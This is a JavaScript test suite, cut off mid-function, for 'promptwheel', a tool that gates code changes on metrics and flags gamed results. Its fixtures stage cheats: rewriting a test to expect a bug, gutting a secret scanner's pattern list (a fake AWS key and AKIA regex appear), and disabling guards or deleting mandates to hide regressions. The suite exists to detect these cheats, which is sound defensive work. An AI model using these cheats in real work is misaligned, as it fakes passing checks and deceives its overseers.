  assert.equal(existsSync(stale), false, 'a day-old dir of another repo is an orphan nobody will claim: pruned');
  assert.equal(existsSync(young), true, 'an untagged dir younger than a day must survive');
  for (const p of [other, stale, young, d]) rmSync(p, { recursive: true, force: true });
});

// ---------------------------------------- guardrail inheritance + observability
const reportOf = (out) => JSON.parse(out.slice(out.indexOf('{'), out.lastIndexOf('}') + 1));

test('extends: inherits a base config, local overrides by name', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-inh-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'base.json'), JSON.stringify({ metrics: [
    { name: 'tests', cmd: 'true', extract: 'exit', direction: 'pass', guard: true },
    { name: 'lint', cmd: 'echo 0', extract: 'number', direction: 'down', guard: true },
  ] }));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: './base.json', metrics: [
    { name: 'lint', cmd: 'echo 0', extract: 'number', direction: 'down', guard: false }, // loosen inherited guard → info
    { name: 'cost', cmd: 'echo 1', extract: 'number', direction: 'down', guard: true },  // add a local guard
  ] }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  const r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--json']);
  assert.notEqual(r.code, 64, r.out);
  const by = Object.fromEntries(reportOf(r.out).metrics.map((x) => [x.name, x]));
  assert.equal(by.tests.guard, true);   // inherited + enforced
  assert.equal(by.lint.guard, false);   // local override loosened it
  assert.equal(by.cost.guard, true);    // added locally
  rmSync(d, { recursive: true, force: true });
});

test('extends: a diamond (two bases sharing a grandparent) is NOT a false cycle', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-diamond-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'd.json'), JSON.stringify({ metrics: [{ name: 'base_m', cmd: 'echo 1', extract: 'number', direction: 'up', guard: true }] }));
  writeFileSync(join(d, 'b.json'), JSON.stringify({ extends: './d.json', metrics: [{ name: 'b_m', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'c.json'), JSON.stringify({ extends: './d.json', metrics: [{ name: 'c_m', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: ['./b.json', './c.json'], metrics: [{ name: 'local_m', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  const r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--json']);
  assert.notEqual(r.code, 64, r.out); // diamond resolves, no false "cycle"
  const names = reportOf(r.out).metrics.map((x) => x.name);
  for (const n of ['base_m', 'b_m', 'c_m', 'local_m']) assert.ok(names.includes(n), `missing ${n}`);
  rmSync(d, { recursive: true, force: true });
});

test('extends: a real self-cycle still exits 64 (config error)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-cycle-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, extends: './promptwheel.config.json', metrics: [{ name: 'm', cmd: 'echo 1', extract: 'number', direction: 'up' }] }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  assert.equal(pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD']).code, 64); // true cycle caught
  rmSync(d, { recursive: true, force: true });
});

test("published tarball includes every file the CLI shells out to", () => {
  const out = execFileSync("npm", ["pack", "--dry-run", "--json"], {
    cwd: join(dirname(fileURLToPath(import.meta.url)), ".."), encoding: "utf8" });
  const files = JSON.parse(out)[0].files.map((f) => f.path);
  for (const f of ["packs/supply-chain/scan.mjs", "packs/supply-chain/lock.mjs"])
    assert.ok(files.includes(f), `${f} must ship in the tarball: init copies it and \`lock\` imports it`);
  assert.ok(files.includes("bin/promptwheel.d.ts"), "the type declarations must ship in the tarball");
});

// ---------------------------------------------------- types: the hand-written .d.ts tracks the runtime exports
test('types: bin/promptwheel.d.ts exists, declares every runtime export, and package.json points at it', async () => {
  const dtsPath = join(dirname(ENGINE), 'promptwheel.d.ts');
  assert.ok(existsSync(dtsPath), 'bin/promptwheel.d.ts is missing');
  const dts = readFileSync(dtsPath, 'utf8');
  const runtime = Object.keys(await import('../bin/promptwheel.mjs')).sort();
  assert.ok(runtime.length >= 16, `expected the engine's export list, got ${runtime.length}`);
  for (const name of runtime) {
    assert.match(dts, new RegExp(`^export declare (function|const) ${name}\\b`, 'm'), `promptwheel.d.ts does not declare the runtime export "${name}"`);
  }
  const pkg = JSON.parse(readFileSync(join(dirname(ENGINE), '..', 'package.json'), 'utf8'));
  assert.equal(pkg.types, './bin/promptwheel.d.ts');
  assert.equal(pkg.exports['.'].types, './bin/promptwheel.d.ts', 'the "." export must carry a types condition');
  assert.equal(pkg.exports['.'].default, './bin/promptwheel.mjs', 'the "." export must still resolve to the engine');
});

test("a guard whose command cannot run must NOT pass, cold eval scripts that are missing", () => {
  const d = mkdtempSync(join(tmpdir(), "pw-preset-"));
  const g = (a) => execFileSync("git", ["-C", d, ...a], { env: { ...process.env,
    GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
  g(["init", "-q"]);
  writeFileSync(join(d, "a.js"), "let x = 1;\n");
  g(["add", "-A"]); g(["commit", "-q", "-m", "one"]);
  writeFileSync(join(d, "promptwheel.config.json"), JSON.stringify({ metrics: [
    { name: "eval_pass_rate", cmd: "node eval.mjs", extract: "number", direction: "up", guard: true },
    { name: "cost_per_run_usd", cmd: "node estimate-cost.mjs", extract: "number", direction: "down", guard: true },
  ] }));
  let out = "", code = 0;
  try {
    out = execFileSync(process.execPath, [ENGINE, "run", "--base", "HEAD", "--head", "HEAD"], { cwd: d, encoding: "utf8" });
  } catch (e) { code = e.status; out = `${e.stdout || ""}${e.stderr || ""}`; }
  assert.notEqual(code, 0, "missing eval scripts must not exit 0");
  assert.ok(!/verdict:\s*PASS/i.test(out), "must not report PASS: " + out.slice(-200));
});

test("gutting a pack copied into .promptwheel is GAMED, not an improvement", () => {
  const d = mkdtempSync(join(tmpdir(), "pw-game-"));
  const g = (a) => execFileSync("git", ["-C", d, ...a], { env: { ...process.env,
    GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
  g(["init", "-q"]);
  writeFileSync(join(d, "app.js"), "const secret = 'AKIA1234567890ABCDEF';\n");
  g(["add", "-A"]); g(["commit", "-q", "-m", "base with a finding"]);
  mkdirSync(join(d, ".promptwheel", "packs", "scan"), { recursive: true });
  writeFileSync(join(d, ".promptwheel", "packs", "scan", "scan.mjs"),
    "import { readFileSync } from 'node:fs';\nconst { patterns } = JSON.parse(readFileSync(new URL('./patterns.json', import.meta.url), 'utf8'));\nconst text = readFileSync('app.js', 'utf8');\nconsole.log(patterns.filter((p) => new RegExp(p).test(text)).length);\n");
  writeFileSync(join(d, ".promptwheel", "packs", "scan", "patterns.json"), JSON.stringify({ patterns: ["AKIA[0-9A-Z]{16}"] }) + "\n");
  writeFileSync(join(d, "promptwheel.config.json"), JSON.stringify({ linkNodeModules: false, metrics: [
    { name: "findings", cmd: "node .promptwheel/packs/scan/scan.mjs", extract: "number", direction: "down", guard: true },
  ] }));
  g(["add", "-A"]); g(["commit", "-q", "-m", "wire the gate"]);
  // the cheat: gut the pattern database, touch nothing else
  writeFileSync(join(d, ".promptwheel", "packs", "scan", "patterns.json"),
    JSON.stringify({ patterns: [] }) + "\n");
  g(["add", "-A"]); g(["commit", "-q", "-m", "improve security posture"]);
  let out = "", code = 0;
  try {
    out = execFileSync(process.execPath,
      [ENGINE, "run", "--base", "HEAD~1", "--head", "HEAD", "--detect-gaming", "--json"],
      { cwd: d, encoding: "utf8" });
  } catch (e) { code = e.status; out = `${e.stdout || ""}`; }
  const rep = JSON.parse(out);
  assert.equal(rep.metrics[0].status, "improved", "the gutted scanner reads as a win, so the re-run has one to judge");
  assert.notEqual(rep.verdict, "pass", "pattern-gutting must not PASS: " + rep.verdict);
  assert.notEqual(code, 0, "exit must be nonzero");
});

// -------------------------------------------------------- integration: no-ai-tells preset
test('preset no-ai-tells: writes an em_dashes guard that regresses when an em-dash is added', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-emdash-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'doc.md'), 'clean prose, no tells here\n'); commitAll(d, 'base: clean');
  const init = pw(d, ['init', '--preset', 'no-ai-tells']);
  assert.equal(init.code, 0, init.out);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.ok(cfg.metrics.some((m) => m.name === 'em_dashes'), 'em_dashes guard present');
  commitAll(d, 'add the no-ai-tells gate');
  writeFileSync(join(d, 'doc.md'), 'clean prose, no tells here\nnow with an — em-dash\n'); commitAll(d, 'sneak in an em-dash');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 1, r.out);
  assert.match(r.out, /em_dashes|FAIL/);
  rmSync(d, { recursive: true, force: true });
});

// ======================================================================================
// Public library API + the Verified-Outcome Contract (INTEGRATE.md / CONTRACT.md)
// ======================================================================================

// ---------------------------------------------------------------- unit: Section 1 + vocab
test('verdictExitCode: the Section 1 verdict -> exit-code mapping', () => {
  assert.equal(verdictExitCode('pass'), 0);
  assert.equal(verdictExitCode('fail'), 1);
  assert.equal(verdictExitCode('gamed'), 2);
  assert.equal(verdictExitCode('inconclusive'), 3);
});
test('contract vocab exports are the fixed Section 2 sets', () => {
  assert.deepEqual([...VERDICTS], ['pass', 'fail', 'gamed', 'inconclusive']);
  assert.deepEqual([...DIRECTIONS], ['up', 'down', 'pass']);
  assert.deepEqual([...METRIC_STATUSES], ['improved', 'regressed', 'unchanged', 'inconclusive', 'unmeasurable']);
  assert.equal(CONTRACT_VERSION, '1');
});

// ---------------------------------------------------------- unit: conformsToContract
const validReport = () => ({
  base: 'a1b2c3d', head: 'e4f5g6h', mode: 'refs', repeat: 3, cohort: 'ci', verdict: 'pass',
  subsystems: ['api'],
  metrics: [{ name: 'tests_pass', direction: 'pass', guard: true, before: 1, after: 1, delta: 0, status: 'unchanged', ok: true, confidence: 'high', noise: 0 }],
});
test('conformsToContract: a well-formed Section 2 report conforms', () => {
  const r = conformsToContract(validReport());
  assert.equal(r.ok, true, r.errors.join('; '));
});
test('conformsToContract: rejects an unknown verdict', () => {
  const r = conformsToContract({ ...validReport(), verdict: 'green' });
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /verdict must be one of/);
});
test('conformsToContract: rejects a bad metric status and direction', () => {
  const rep = validReport(); rep.metrics[0].status = 'ok'; rep.metrics[0].direction = 'sideways';
  const r = conformsToContract(rep);
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /status must be one of/);
  assert.match(r.errors.join(' '), /direction must be one of/);
});
test('conformsToContract: a pass may not hide a guarded regression', () => {
  const rep = validReport(); rep.metrics[0].ok = false; // guard:true + ok:false but verdict stays pass
  const r = conformsToContract(rep);
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /guarded metric regressed/);
});
test('conformsToContract: a gamed verdict must point at a gamed metric', () => {
  const r = conformsToContract({ ...validReport(), verdict: 'gamed' });
  assert.equal(r.ok, false);
  assert.match(r.errors.join(' '), /no metric is gamed/);
});
test('conformsToContract: a non-object is rejected cleanly', () => {
  assert.equal(conformsToContract(null).ok, false);
  assert.equal(conformsToContract('x').ok, false);
});

// -------------------------------------------------------- integration: check() in process
test('check(): returns the Section 2 verdict in process and never exits (pass on a real fix)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve in source');
  const report = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(report.verdict, 'pass', JSON.stringify(report.metrics));
  assert.equal(verdictExitCode(report.verdict), 0);
  assert.equal(conformsToContract(report).ok, true, conformsToContract(report).errors.join('; '));
  assert.equal(report.metrics.find((m) => m.name === 'todos').status, 'improved');
  rmSync(d, { recursive: true, force: true });
});
test('check(): verdict gamed when the win came from editing the test, not the source', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'node --test calc.test.mjs 2>&1', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'calc.mjs'), 'export const sub = (a, b) => a + b;\n'); // BUG: should be a - b
  writeFileSync(join(d, 'calc.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; import { sub } from './calc.mjs'; test('sub', () => assert.strictEqual(sub(5, 3), 2));\n");
  commitAll(d, 'base: red test, buggy source');
  writeFileSync(join(d, 'calc.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; import { sub } from './calc.mjs'; test('sub', () => assert.strictEqual(sub(5, 3), 8));\n");
  commitAll(d, 'game it: edit the test to expect the buggy answer');
  const report = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(report.verdict, 'gamed', JSON.stringify(report.metrics));
  assert.equal(verdictExitCode(report.verdict), 2);
  assert.ok(report.metrics.find((m) => m.gamed === true), 'a metric is flagged gamed');
  assert.equal(conformsToContract(report).ok, true, conformsToContract(report).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('check(): with auto:false throws (does not exit) on a missing config', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-nocfg-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'x.js'), '1\n'); commitAll(d, 'base');
  assert.throws(() => check({ repo: d, auto: false }), (e) => e.name === 'ConfigError' && e.exitCode === 64 && /no promptwheel\.config\.json/.test(e.message));
  // the other two preconditions carry the same name and code
  assert.throws(() => check({ repo: d, config: { metrics: [] } }), (e) => e.name === 'ConfigError' && e.exitCode === 64);
  const notRepo = mkdtempSync(join(tmpdir(), 'pw-norepo-'));
  assert.throws(() => check({ repo: notRepo }), (e) => e.name === 'ConfigError' && e.exitCode === 64 && /not inside a git repository/.test(e.message));
  rmSync(notRepo, { recursive: true, force: true });
  rmSync(d, { recursive: true, force: true });
});
test('check(): accepts an in-process config object (no config file needed)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-inlinecfg-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve');
  const report = check({ repo: d, base: 'HEAD~1', head: 'HEAD', config: { linkNodeModules: false, metrics: [TODOS] } });
  assert.equal(report.verdict, 'pass', JSON.stringify(report.metrics));
  assert.throws(() => check({ repo: d, config: { metrics: [] } }), /non-empty array/);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: gate integrity (Section 3)
test('gate integrity: disabling a guard to hide a regression reads GAMED', () => {
  const d = tmpRepo([TODOS]);                        // todos is a guard (direction down)
  writeFileSync(join(d, 'app.js'), 'clean\n'); commitAll(d, 'base: 0 TODOs, guard on');
  // head: ADD a regression (2 TODOs) AND disable the guard in the same diff
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TODOS, guard: false }] }));
  commitAll(d, 'regress + disable the guard');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'gamed', JSON.stringify(r));
  assert.ok(r.gate && Array.isArray(r.gate.weakened) && r.gate.weakened.some((w) => w.name === 'todos'), 'gate weakening recorded');
  assert.notEqual(r.gate.fingerprint.base, r.gate.fingerprint.head);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: disabling a guard that was NOT regressing is not gaming (no false positive)', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\n'); commitAll(d, 'base: 1 TODO');
  // head: a real improvement in source (0 TODOs) AND retire the guard (legit config cleanup)
  writeFileSync(join(d, 'app.js'), 'clean\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ ...TODOS, guard: false }] }));
  commitAll(d, 'improve + retire the guard');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass', JSON.stringify(r));
  assert.ok(!r.gate.weakened, 'no weakening flagged when the dropped guard was not regressing');
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: fingerprint present, and identical when the gate is unchanged', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'app.js'), 'a\nb\n'); commitAll(d, 'improve, gate unchanged');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.equal(r.gate.fingerprint.base, r.gate.fingerprint.head, 'identical gate -> identical fingerprint');
  assert.match(r.gate.fingerprint.head, /^[0-9a-f]{16}$/);
  rmSync(d, { recursive: true, force: true });
});
test('gate integrity: deleting a guarded metric that regressed reads GAMED', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'clean\n'); commitAll(d, 'base: guard present');
  // head: regress AND remove the metric entirely from the config
  writeFileSync(join(d, 'app.js'), 'a // TODO\nb // TODO\nc // TODO\n');
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [{ name: 'noop', cmd: 'echo 1', extract: 'number', direction: 'up', guard: false }] }));
  commitAll(d, 'regress + delete the guard metric');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'gamed', JSON.stringify(r));
  assert.ok(r.gate.weakened.some((w) => w.name === 'todos' && w.change === 'guard-removed'), 'removed guard recorded');
  rmSync(d, { recursive: true, force: true });
});

test('gate integrity: an unchanged mandate (local or inherited) yields identical fingerprints; a deleted mandate changes it and the report says so', () => {
  const MD = { name: 'no-secrets', paths: ['secrets.json'], reason: 'frozen' };
  const mk = (baseCfg, headCfg, extra = {}) => {
    const d = tmpRepo([TODOS]);
    for (const [f, c] of Object.entries(extra)) writeFileSync(join(d, f), JSON.stringify(c));
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(baseCfg));
    writeFileSync(join(d, 'secrets.json'), '{"v":1}\n'); writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');                                   // a real source win, protected path untouched
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify(headCfg));
    commitAll(d, 'head');
    return d;
  };
  // 1. same mandate at both refs -> same fingerprint, nothing flagged (this was FALSE in 0.7.4: base never collected mandates)
  let d = mk({ linkNodeModules: false, mandates: [MD], metrics: [TODOS] }, { linkNodeModules: false, mandates: [MD], metrics: [TODOS] });
  let r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.equal(r.gate.fingerprint.base, r.gate.fingerprint.head, 'unchanged mandate must not perturb the fingerprint');
  assert.ok(!r.gate.changed);
  rmSync(d, { recursive: true, force: true });
  // 1b. the same, with the mandate INHERITED through extends at both refs
  const inh = { linkNodeModules: false, extends: './base.json', metrics: [TODOS] };
  d = mk(inh, inh, { 'base.json': { mandates: [MD], metrics: [] } });
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.gate.fingerprint.base, r.gate.fingerprint.head, 'an inherited mandate resolves the same at base and head');
  assert.ok(!r.gate.changed);
  rmSync(d, { recursive: true, force: true });
  // 2. mandate quietly deleted at head -> different fingerprint, gate.changed, and the human report names it
  d = mk({ linkNodeModules: false, mandates: [MD], metrics: [TODOS] }, { linkNodeModules: false, mandates: [], metrics: [TODOS] });
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.notEqual(r.gate.fingerprint.base, r.gate.fingerprint.head, 'deleting a mandate must change the fingerprint (tamper-evident)');
  assert.equal(r.gate.changed, true);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.match(cli.out, /gate definition changed/);
  assert.match(pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--markdown']).out, /Gate definition changed/);
  rmSync(d, { recursive: true, force: true });
});

test('mandates: deleting a mandate in the same change that violates it does not clear it (base mandates stay in force)', () => {
  const MD = { name: 'no-secrets', paths: ['secrets.json'], reason: 'frozen' };
  const mk = (touchProtected) => {
    const d = tmpRepo([TODOS]);
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, mandates: [MD], metrics: [TODOS] }));
    writeFileSync(join(d, 'secrets.json'), '{"v":1}\n'); writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, metrics: [TODOS] }));   // mandate deleted at head
    if (touchProtected) writeFileSync(join(d, 'secrets.json'), '{"v":2}\n');
    commitAll(d, 'head');
    return d;
  };
  // the bypass: delete the rule and break it in one commit -> still FAIL, reported as removed, exit 1
  let d = mk(true);
  let r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'fail');
  assert.ok(r.mandates && r.mandates[0].name === 'no-secrets' && r.mandates[0].removed === true, JSON.stringify(r.mandates));
  assert.equal(r.gate.changed, true);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 1);
  assert.match(cli.out, /MANDATE "no-secrets" violated/);
  assert.match(cli.out, /deleted in this same change/);
  // without gaming detection the base mandates are still enforced
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD', detectGaming: false });
  assert.equal(r.verdict, 'fail');
  rmSync(d, { recursive: true, force: true });
  // retiring the mandate in its own change (protected path untouched): allowed, PASS, fingerprint change recorded
  d = mk(false);
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.ok(!r.mandates);
  assert.equal(r.gate.changed, true);
  rmSync(d, { recursive: true, force: true });
});

test('mandates: narrowing a mandate in the same change that violates it does not clear it (the base version stays in force, reported as edited)', () => {
  const mk = (touchProtected) => {
    const d = tmpRepo([TODOS]);
    mkdirSync(join(d, 'test', 'legacy'), { recursive: true });
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, mandates: [{ name: 'tests', paths: ['test/**'], reason: 'frozen' }], metrics: [TODOS] }));
    writeFileSync(join(d, 'test', 'a.js'), '1\n'); writeFileSync(join(d, 'test', 'legacy', 'b.js'), '1\n'); writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
    writeFileSync(join(d, 'app.js'), 'x\n');
    writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ linkNodeModules: false, mandates: [{ name: 'tests', paths: ['test/legacy/**'], reason: 'frozen' }], metrics: [TODOS] }));   // narrowed at head
    if (touchProtected) writeFileSync(join(d, 'test', 'a.js'), '2\n');   // outside the narrowed paths, inside the base ones
    commitAll(d, 'head');
    return d;
  };
  let d = mk(true);
  let r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'fail');
  assert.ok(r.mandates && r.mandates.length === 1 && r.mandates[0].name === 'tests' && r.mandates[0].edited === true && !r.mandates[0].removed, JSON.stringify(r.mandates));
  assert.deepEqual(r.mandates[0].files, ['test/a.js']);
  assert.equal(conformsToContract(r).ok, true, conformsToContract(r).errors.join('; '));
  const cli = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 1);
  assert.match(cli.out, /MANDATE "tests" violated/);
  assert.match(cli.out, /edited in this same change/);
  rmSync(d, { recursive: true, force: true });
  // narrowing the rule in its own change (nothing protected touched): allowed, PASS, fingerprint change recorded
  d = mk(false);
  r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.verdict, 'pass');
  assert.ok(!r.mandates);
  assert.equal(r.gate.changed, true);
  rmSync(d, { recursive: true, force: true });
});

test('check(): a malformed config or a missing extends target throws a ConfigError (exitCode 64), never exits the host process', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'x\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'promptwheel.config.json'), '{ not json');
  assert.throws(() => check({ repo: d }), (e) => e.name === 'ConfigError' && e.exitCode === 64 && /invalid config/.test(e.message));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ extends: './missing.json', metrics: [TODOS] }));
  assert.throws(() => check({ repo: d }), (e) => e.name === 'ConfigError' && /extends target not found/.test(e.message));
  // the CLI maps the same error to exit 64
  const cli = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record']);
  assert.equal(cli.code, 64, cli.out);
  rmSync(d, { recursive: true, force: true });
});

test('resolveBase: on the trunk itself (merge-base == HEAD) the default base is the last commit, never HEAD vs HEAD', () => {
  const d = tmpRepo([TODOS]);
  writeFileSync(join(d, 'app.js'), 'x // TODO\n'); commitAll(d, 'base');
  execFileSync('git', ['branch', '-M', 'main'], { cwd: d });
  writeFileSync(join(d, 'app.js'), 'x\n'); commitAll(d, 'head');
  const r = check({ repo: d });                                     // no base/head given, on main
  assert.notEqual(r.base, r.head, 'a bare run on main must compare the last commit, not a commit to itself');
  assert.equal(r.metrics[0].status, 'improved');
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: zero-config (no config file)
function bareRepo() {
  const d = mkdtempSync(join(tmpdir(), 'pw-zc-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  return d;
}
test('zero-config: run auto-detects the test command when no config file exists', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'zc', scripts: { test: 'node --test' } }));
  writeFileSync(join(d, 'a.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; test('t', () => assert.ok(true));\n");
  commitAll(d, 'base');
  writeFileSync(join(d, 'note.txt'), 'x'); commitAll(d, 'honest change');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0, r.out);   // the "auto-gating ..." note is on stderr so --json stays clean
  assert.match(r.out, /tests_pass/);
  assert.match(r.out, /PASS/);
  rmSync(d, { recursive: true, force: true });
});
test('zero-config: --no-auto restores the require-a-config behavior (exit 64)', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'f.txt'), 'a'); commitAll(d, 'base'); writeFileSync(join(d, 'f.txt'), 'b'); commitAll(d, 'change');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-auto']);
  assert.equal(r.code, 64, r.out);
  assert.match(r.out, /no promptwheel\.config\.json/);
  rmSync(d, { recursive: true, force: true });
});
test('zero-config: no test command -> inert -> INCONCLUSIVE with a helpful message', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'f.txt'), 'a'); commitAll(d, 'base'); writeFileSync(join(d, 'f.txt'), 'b'); commitAll(d, 'change');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 3, r.out);   // inconclusive, never a fake green
  assert.match(r.out, /never ran|INCONCLUSIVE/);
  rmSync(d, { recursive: true, force: true });
});
test('check(): falls back to auto-config when no config file exists', () => {
  const d = bareRepo();
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'zc', scripts: { test: 'node --test' } }));
  writeFileSync(join(d, 'a.test.mjs'), "import { test } from 'node:test'; import assert from 'node:assert'; test('t', () => assert.ok(true));\n");
  commitAll(d, 'base'); writeFileSync(join(d, 'note.txt'), 'x'); commitAll(d, 'change');
  const r = check({ repo: d, base: 'HEAD~1', head: 'HEAD' });
  assert.equal(r.metrics[0].name, 'tests_pass');
  assert.equal(r.verdict, 'pass', JSON.stringify(r.metrics));
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------------------- integration: Promptwheel-Allow (declared override; Sawbuck-Allow is an alias)
const CALC = (expect) => `import { test } from 'node:test'; import assert from 'node:assert'; import { sub } from './calc.mjs'; test('s', () => assert.strictEqual(sub(5, 3), ${expect}));\n`;
function gamedRepo() {
